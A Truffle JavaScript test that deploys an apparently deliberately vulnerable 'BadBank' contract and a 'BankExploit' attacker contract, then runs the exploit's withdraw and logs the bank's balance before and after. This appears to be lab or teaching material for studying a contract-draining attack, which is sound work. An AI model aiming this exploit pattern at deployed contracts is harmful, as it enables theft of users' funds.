const BankAbstraction = artifacts.require('BadBank');
const ExploitAbstraction = artifacts.require('BankExploit')

let BANK
contract('BadBank', (accounts) => {
  beforeEach( async () => {
    BANK = await BankAbstraction.new({from: accounts[0]});
  })
  it('funding the contract and running the exploit', async () => {
    console.log(BANK.address)

    //Add balance to the contract
    var balance = await BANK.getUserBalance.call(accounts[0])
    // console.log(balance.toNumber())

    var boolean = await BANK.addToBalance.sendTransaction({from: accounts[0], value: 10000})
    console.log(boolean)

    balance = await BANK.getUserBalance.call(accounts[0])
    // console.log(balance.toNumber())

    // boolean = await BANK.withdrawBalance.sendTransaction({from: accounts[0]})
    // console.log(boolean)
    //
    // balance = await BANK.getUserBalance.call(accounts[0])
    // console.log(balance.toNumber())

    let ATTACKER = await ExploitAbstraction.new(BANK.address, 1, {from: accounts[0]})
    // console.log(ATTACKER.address)
    await ATTACKER.deposit.sendTransaction({from:accounts[0], value: 1000})
    balance = await BANK.getUserBalance.call(ATTACKER.address)
    // console.log(balance.toNumber())
    balance = await BANK.getUserBalance.call(accounts[0])
    // console.log(balance.toNumber())
    console.log(web3.eth.getBalance(ATTACKER.address))
    var contractBalance = await BANK.checkBalance.call({from: accounts[0]})
    console.log("before the exploit")
    console.log(contractBalance.toNumber())
    await ATTACKER.withdraw.sendTransaction({from: accounts[0]})
    contractBalance = await BANK.checkBalance.call({from: accounts[0]})
    console.log("after the exploit")
    console.log(contractBalance.toNumber())

  })
})
